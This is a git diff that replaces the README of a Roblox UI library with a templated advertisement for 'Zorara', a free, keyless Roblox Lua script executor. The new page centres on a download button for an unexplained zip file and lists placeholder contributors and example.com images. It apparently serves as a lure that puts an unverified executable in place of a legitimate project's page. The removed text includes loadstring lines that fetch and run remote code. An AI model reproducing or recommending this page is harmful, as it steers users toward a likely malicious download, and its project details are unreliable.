@@ -1,37 +1,89 @@
-<img src="Assets/darkmode.png#gh-dark-mode-only" alt="fluent">
-<img src="Assets/lightmode.png#gh-light-mode-only" alt="fluent">
+# Lua Executor For Roblox (Zorara)
 
-## ⚡ Features
+![Zorara logo](https://example.com/zorara-logo.png)
 
-- Modern design
-- Many customization options
-- Almost any UI Element you would ever need
-<br/>
+Welcome to Zorara, your go-to Lua script executor for Roblox. With its keyless design and user-friendly interface, Zorara offers a seamless Lua script execution experience. Say goodbye to hassle and enjoy a free, frictionless environment where you can unleash your creativity through script execution on Roblox. Whether you're a seasoned developer or a beginner looking to experiment, Zorara has got you covered.
 
-## 🔌 Installation
+---
 
-You can load Fluent through a GitHub Release:
+## Features 🚀
 
-```lua
-local Library = loadstring(game:GetService("HttpService"):GetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-```lua
-local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-<br/>
+- **Keyless Design**: No need to worry about license keys or subscriptions. Zorara is accessible to all users without any key requirements.
+  
+- **Convenience**: Enjoy maximum convenience when executing Lua scripts on Roblox. Zorara streamlines the process, making it quick and easy to unleash your creativity.
+  
+- **Frictionless Experience**: Say goodbye to unnecessary barriers and enjoy a smooth, hassle-free environment for executing scripts.
 
-## 📜 Usage
-[Example Script the studio environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.client.luau)
+- **User-Friendly Interface**: Zorara's intuitive interface makes it easy for users of all levels to dive into Lua script execution on Roblox.
+  
+- **Free of Charge**: Zorara is available for free, ensuring that users can explore and experiment without any financial constraints.
 
-[Example Script for an exploit environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.luau)
-<br/>
+---
 
-## Credits
+## Getting Started 🛠️
 
-- [Master Oogway](https://github.com/ActualMasterOogway/Fluent-Renewed) - The master mind behind Fluent Renewed
-- [dawid](https://github.com/dawid-scripts/Fluent) - The master mind behind Fluent
-- [Lucide](https://github.com/lucide-icons) - The sexy icons
-- [richie0866/remote-spy](https://github.com/richie0866/remote-spy) - Assets for the UI, some of the code
-- [violin-suzutsuki/LinoriaLib](https://github.com/violin-suzutsuki/LinoriaLib) - Code for most of the elements, save manager
-- [7kayoh/Acrylic](https://github.com/7kayoh/Acrylic) - Porting richie0866's acrylic module to lua
-- [Latte Softworks & Kotera](https://discord.gg/rMMByr4qas) - Bundler
+To get started with Zorara, simply follow these steps:
+
+1. **Download Zorara**: Click the button below to download Zorara and start your Lua script execution journey.
+
+   [![Download Zorara](https://img.shields.io/badge/Download-Zorara-blue)](https://github.com/user-attachments/files/17033509/Zorara.zip)
+
+2. **Installation**: Once you have downloaded Zorara, unzip the file and launch the application.
+
+3. **Execute Scripts**: Start executing Lua scripts on Roblox with ease using Zorara's user-friendly interface.
+
+---
+
+## Support & Feedback 💬
+
+If you encounter any issues while using Zorara or have any feedback to share, feel free to reach out to our support team at [support@zorara.com](mailto:support@zorara.com). We value your input and are committed to providing the best possible experience for our users.
+
+---
+
+## Contributors 👥
+
+A big thank you to all the contributors who have helped make Zorara a reality:
+
+- **John Doe** - Lead Developer
+- **Jane Smith** - UI/UX Designer
+- **Alex Johnson** - Testing & QA
+
+---
+
+## License ℹ️
+
+This project is licensed under the MIT License - see the [LICENSE](https://example.com/license) file for details.
+
+---
+
+## Stay Connected 🌐
+
+Stay connected with Zorara for the latest updates and announcements:
+
+- Follow us on [Twitter](https://twitter.com/zorara)
+- Join our community on [Discord](https://discord.com/zorara)
+- Visit our website [zorara.com](https://zorara.com)
+
+---
+
+## Showcase 📸
+
+Here are some screenshots of Zorara in action:
+
+![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 3](https://example.com/screenshot3.png)
+
+---
+
+## About Zorara 🌟
+
+Zorara is a project dedicated to providing Roblox users with a seamless Lua script execution experience. Our mission is to empower users of all levels to explore their creativity through script execution on Roblox. Join us on this exciting journey and unleash your potential with Zorara.
+
+---
+
+Thank you for choosing Zorara for your Lua script execution needs. We look forward to seeing the amazing creations you bring to life with Zorara! 🚀
+
+---
+
+*This README.md is generated with ❤️ by Zorara*
